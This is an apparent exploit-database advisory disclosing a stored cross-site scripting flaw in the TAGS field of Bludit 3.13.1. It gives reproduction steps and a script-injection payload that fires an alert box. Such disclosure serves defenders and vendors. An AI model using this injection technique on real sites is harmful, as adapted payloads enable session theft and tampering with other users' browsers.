# Bludit 3.13.1 - TAGS Field Stored Cross Site Scripting (XSS)
Bludit 3.13.1 - TAGS Field Stored Cross Site Scripting (XSS)

### Exploit Title: Bludit 3.13.1 - TAGS Field Stored Cross Site Scripting (XSS)
### Date: 20/12/2021
### Exploit Author: P.L.Sanu
### Exploit Author Website: https://www.plsanu.com
### Vendor Homepage: https://www.bludit.com
### Software Link: https://www.bludit.com/releases/bludit-3-13-1.zip
### Version: <= 3.13.1
### Tested on: Windows 10
### CVE : 
### Google Dork: N/A
### Reference: 
- https://www.plsanu.com/bludit-3-13-1-tags-field-stored-cross-site-scripting-xss
- https://github.com/plsanu/Bludit-3.13.1-TAGS-Field-Stored-Cross-Site-Scripting-XSS

### Steps to Reproduce:
1. Login to the admin panel http://localhost/admin
2. Navigate to New content section.
3. Enter the title of the post Ex:test
4. Click on the Options button.
5. Navigate to Advanced tab and inject the payload "><script>alert("XSS")</script> in TAGS section.
6. Click on Save button.
7. Open the post(test).
8. Malicious javascript code triggered.
